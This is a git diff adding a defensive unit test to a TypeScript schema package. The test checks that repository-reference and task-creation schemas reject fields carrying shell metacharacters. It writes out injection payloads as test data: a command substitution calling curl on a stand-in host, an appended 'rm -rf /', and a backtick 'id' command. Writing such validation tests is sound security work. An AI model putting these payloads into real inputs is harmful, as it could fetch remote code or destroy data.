@@ -1,5 +1,7 @@
 import { describe, it, expect } from "bun:test";
 import {
+  RepoRefSchema,
+  CreateTaskInputSchema,
   TaskStatusSchema,
   TaskSchema,
   StreamEventSchema,
@@ -216,5 +218,25 @@ describe("Domain contracts (@cloud-worker/shared)", () => {
     });
     expect(turnStartEvent.type).toBe("turn_start");
   });
-});
+  it("rejects repo ref fields carrying shell metacharacters", () => {
+    // Injection payloads must fail validation before reaching git commands
+    const injection = 'main" "$(curl evil.example)"';
+    expect(RepoRefSchema.safeParse({ owner: "acme", repo: "api", branch: injection }).success).toBe(false);
+    expect(RepoRefSchema.safeParse({ owner: "acme; rm -rf /", repo: "api" }).success).toBe(false);
+    expect(RepoRefSchema.safeParse({ owner: "acme", repo: "api", branch: "main", baseCommit: "abc`;id`" }).success).toBe(false);
 
+    // Legitimate git identifiers still pass
+    expect(RepoRefSchema.safeParse({ owner: "acme-corp", repo: "payment.service", branch: "feature/auth-v2" }).success).toBe(true);
+    expect(
+      RepoRefSchema.safeParse({ owner: "acme", repo: "api", branch: "main", baseCommit: "a1b2c3d4e5f6" }).success,
+    ).toBe(true);
+
+    // The task creation contract enforces the same rules end to end
+    const maliciousCreate = CreateTaskInputSchema.safeParse({
+      repo: { owner: "acme", repo: "api", branch: injection },
+      prompt: "fix bug",
+      model: "codex",
+    });
+    expect(maliciousCreate.success).toBe(false);
+  });
+});
